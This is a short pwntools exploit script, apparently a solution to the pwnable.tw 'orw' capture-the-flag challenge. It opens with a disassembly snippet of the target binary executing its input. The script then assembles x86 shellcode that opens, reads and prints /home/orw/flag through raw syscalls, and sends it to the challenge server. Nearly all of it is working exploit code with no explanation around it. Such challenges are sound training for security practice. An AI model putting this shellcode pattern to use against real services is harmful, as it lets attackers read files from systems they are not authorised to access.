"""
 8048571:       68 c8 00 00 00          push   0xc8
 8048576:       68 60 a0 04 08          push   0x804a060
 804857b:       6a 00                   push   0x0
 804857d:       e8 ee fd ff ff          call   8048370 <read@plt>
 8048582:       83 c4 10                add    esp,0x10
 8048585:       b8 60 a0 04 08          mov    eax,0x804a060
 804858a:       ff d0                   call   eax

"""

from pwn import *
#context.log_level = 'debug'
elf = ('./orw')
#p = remote('localhost', 7777 )
p = remote('chall.pwnable.tw', 10001 )

path = b'/home/orw/flag\0'
shellcode = asm('\n'.join(
[
'push %d'%u32(path[x:x+4].ljust(4,b'\0')) for x in range(0,len(path),4)
][::-1] + [
'xor edx, edx',
'xor ecx, ecx',
'mov ebx, esp',
'mov eax, 0x5',
'int 0x80',
'mov edx, 0x100',
'mov ecx, 0x0804a040',
'mov ebx, eax',
'mov eax, 0x3',
'int 0x80',
'mov edx, eax',
'mov ebx, 0x01',
'mov eax, 0x04',
'int 0x80'
] ))
info('shellcodei(%d) :%s',len(shellcode), shellcode )

payload = b''
payload += shellcode

p.recvuntil('shellcode:')
p.send( payload )
info("flag :%s", p.recv() )
